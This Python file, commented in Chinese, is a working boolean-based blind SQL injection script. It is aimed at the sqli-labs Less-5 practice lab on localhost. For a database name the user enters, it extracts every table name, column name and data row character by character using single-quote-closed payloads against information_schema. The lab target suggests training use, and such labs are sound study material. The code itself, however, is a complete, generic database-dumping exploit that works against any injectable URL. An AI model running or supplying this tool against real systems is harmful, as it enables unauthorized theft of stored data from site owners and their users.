import requests
#知道数据库名爆破数据库的所有内容
#该脚本的闭合方式是单引号
#点击运行后可以输入数据库名，只对要爆破的数据库进行爆破
# 目标 URL，需要替换为实际的注入点 URL
url = "http://localhost/sqli-labs-master/Less-5/?id="
# 用于判断条件成立的页面特征，需要根据实际情况修改
success_text = "You"

# 布尔盲注函数
def boolean_blind_injection(payload):
    full_url = url + payload
    response = requests.get(full_url)
    return success_text in response.text

# 获取指定数据库中的表数量
def get_table_count(database):
    count = 0
    while True:
        payload = f"1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{database}')={count} --+"
        if boolean_blind_injection(payload):
            break
        count += 1
    return count

# 获取指定数据库中指定索引的表名长度
def get_table_name_length(database, index):
    length = 0
    while True:
        payload = f"1' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {index},1))={length} --+"
        if boolean_blind_injection(payload):
            break
        length += 1
    return length

# 获取指定数据库中指定索引的表名
def get_table_name(database, index, length):
    name = ""
    for i in range(1, length + 1):
        for char in range(32, 127):
            payload = f"1' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {index},1),{i},1))={char} --+"
            if boolean_blind_injection(payload):
                name += chr(char)
                break
    return name

# 获取指定表中的列数量
def get_column_count(database, table):
    count = 0
    while True:
        payload = f"1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}')={count} --+"
        if boolean_blind_injection(payload):
            break
        count += 1
    return count

# 获取指定表中指定索引的列名长度
def get_column_name_length(database, table, index):
    length = 0
    while True:
        payload = f"1' AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {index},1))={length} --+"
        if boolean_blind_injection(payload):
            break
        length += 1
    return length

# 获取指定表中指定索引的列名
def get_column_name(database, table, index, length):
    name = ""
    for i in range(1, length + 1):
        for char in range(32, 127):
            payload = f"1' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='{table}' LIMIT {index},1),{i},1))={char} --+"
            if boolean_blind_injection(payload):
                name += chr(char)
                break
    return name

# 获取指定表中的数据行数
def get_row_count(database, table):
    count = 0
    while True:
        payload = f"1' AND (SELECT COUNT(*) FROM {database}.{table})={count} --+"
        if boolean_blind_injection(payload):
            break
        count += 1
    return count

# 获取指定表中指定行指定列的数据长度
def get_data_length(database, table, column, row):
    length = 0
    while True:
        payload = f"1' AND LENGTH((SELECT {column} FROM {database}.{table} LIMIT {row},1))={length} --+"
        if boolean_blind_injection(payload):
            break
        length += 1
    return length

# 获取指定表中指定行指定列的数据
def get_data(database, table, column, row, length):
    data = ""
    for i in range(1, length + 1):
        for char in range(32, 127):
            payload = f"1' AND ASCII(SUBSTRING((SELECT {column} FROM {database}.{table} LIMIT {row},1),{i},1))={char} --+"
            if boolean_blind_injection(payload):
                data += chr(char)
                break
    return data

# 主函数
def main():
    database = input("请输入要进行盲注的数据库名: ")
    # 对指定数据库进行表名爆破
    print(f"\n正在爆破数据库 {database} 中的表名...")
    table_count = get_table_count(database)
    print(f"数据库 {database} 中的表数量: {table_count}")
    tables = []
    for i in range(table_count):
        length = get_table_name_length(database, i)
        name = get_table_name(database, i, length)
        tables.append(name)
        print(f"数据库 {database} 中第 {i + 1} 个表名: {name}")

    # 对每个表进行列名和数据爆破
    for table in tables:
        print(f"\n正在爆破表 {table} 中的列名和数据...")
        column_count = get_column_count(database, table)
        print(f"表 {table} 中的列数量: {column_count}")
        columns = []
        for i in range(column_count):
            length = get_column_name_length(database, table, i)
            name = get_column_name(database, table, i, length)
            columns.append(name)
            print(f"表 {table} 中第 {i + 1} 个列名: {name}")

        row_count = get_row_count(database, table)
        print(f"表 {table} 中的数据行数: {row_count}")
        for row in range(row_count):
            row_data = []
            for column in columns:
                length = get_data_length(database, table, column, row)
                data = get_data(database, table, column, row, length)
                row_data.append(data)
            print(f"表 {table} 中第 {row + 1} 行数据: {row_data}")

if __name__ == "__main__":
    main()
